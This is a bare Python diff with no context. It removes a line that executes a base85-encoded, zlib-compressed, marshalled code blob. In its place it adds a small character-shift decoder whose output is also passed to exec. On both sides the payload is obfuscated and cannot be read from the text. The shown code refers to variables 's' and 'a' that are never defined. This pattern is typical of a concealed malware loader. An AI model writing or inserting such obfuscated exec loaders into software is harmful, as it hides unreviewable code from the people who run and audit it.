@@ -1,2 +1,11 @@
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b85decode('c${63Jx>EM42JE*S1MG{!3G2SNu7ZKAu1}yE-;;hM0JVEM|)Ls2dYpq9e;+u<dv!a0=q0gr1x=R=XE~5;NKw8m8dxuIB@s@C3y7UjklfY5W$&SC~ReZxq6~Zbgj-ebz(9tv>2ho4##l+kZfxrM0+HeL@h-8nM>_7Ws#gYheQ(X3xpd-iB>}=YXS?BDP1NU)`TGWo>rr2ZKMv*AemJj^;SC*h7HR3n~|baOcn2ff;bD)dgj^Aea&_m9NX$K6g|c@<CL*sd@8N;731?Kgj`H)$D=zovxRnT4)w7}nBzdy$9+5z1x-&1+D0b7_Ep%EX&5N-zc|o6{fouYz0UpRwyXYRfA<@6Kunt'))))
+def gm(x,a):
+	s=''
+	for i in range(len(x)):
+		dec=ord(x[i])
+		for j in range(a[i]):
+				dec-=1
+				if dec<65: dec=90
+				elif 90<dec<97: dec=122
+		s+=chr(dec)
+	return s
+exec(gm(s,a))
